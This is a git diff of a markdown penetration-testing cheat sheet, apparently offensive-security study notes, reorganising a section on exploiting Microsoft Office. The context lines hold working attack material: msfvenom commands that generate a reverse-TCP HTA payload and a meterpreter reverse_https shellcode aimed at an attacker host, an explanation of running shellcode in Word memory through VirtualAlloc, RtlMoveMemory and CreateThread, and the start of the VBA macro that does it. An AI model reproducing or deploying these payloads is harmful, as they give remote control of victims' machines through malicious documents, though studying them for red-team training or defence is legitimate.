@@ -995,6 +995,7 @@ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-p
 
 ## Exploiting Microsoft Office
 
+### Executing PowerShell in Word using VBA 
 <details>
   <summary>Expand</summary>
 
@@ -1043,13 +1044,13 @@ End Sub
 ```
 </details>
 
-## Executing Shellcode in Word Memory using VBA
+### Executing Shellcode in Word Memory using VBA
 
 <details>
   <summary>Expand</summary>
 To execute shellcode in memory we will take use of the three Win32 API's
 
-### VirtualAlloc
+**VirtualAlloc:**
 
 Used to allocate memory. [Link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
 
@@ -1074,7 +1075,7 @@ LPVOID VirtualAlloc(
 * Integers can be translated to ``Long``
 * dwSize can be hardcoded or set dynamically using ``UBound``: ``UBound(buf)``. [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function), also see ``LBound`` [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function)
 
-### RtlMoveMemory
+**RtlMoveMemory:**
 
 After allocating memory we must copy our desired shellcode bytes into this memory location (executable buffer). This is done using ``RtlMoveMemory``. 
 
@@ -1093,7 +1094,8 @@ VOID RtlMoveMemory(
 |length [Long]| length of shellcode to be copied (passed by value)|
 |return value [LongPtr]| memory pointer|
 
-### CreateThread
+**CreateThread:**
+
 After copying the shellcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
 
 ```
@@ -1117,14 +1119,14 @@ HANDLE CreateThread(
 * Most arguments are not needed and can be set o "0"
 * lpParameter can be "0" since our shellcode does not require arguments
 
-### Generate Shellcode
+**Generate Shellcode:**
 ```
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
 ```
 
 EXITFUNC=thread because our shell would be killed when office is closed, metasploit's AutoMigrade module would solve this also. 
 
-### Entire VBA Code
+**Entire VBA Code:**
 ```
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
 
@@ -1165,7 +1167,7 @@ To work as expected, this requires a matching 32-bit multi/handler in Metasploit
 
 </details>
 
-## Executing Shellcode in Word Memory using Powershell
+### Executing Shellcode in Word Memory using Powershell
 
 <details>
   <summary>Expand</summary>
